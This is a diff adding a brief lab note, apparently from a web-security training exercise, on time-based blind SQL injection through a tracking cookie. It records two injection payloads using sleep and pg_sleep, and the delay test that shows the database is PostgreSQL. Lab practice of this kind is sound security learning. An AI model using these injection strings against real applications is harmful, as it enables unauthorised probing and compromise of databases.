@@ -1,0 +1,12 @@
+Lab #13
+
+Vulnerable parameter - tracking cookie
+
+End goals
+    - Cause a 10 second delay via SQLi
+
+    Analysis:
+
+    start fuzzing the app with various sleep commands to see which kind of DB it is
+    ' || (SELECT sleep(10))--   -> No Delay.  Not MySQL
+    ' || (SELECT pg_sleep(10))--  -> WORKED! Is POSTGRESQL
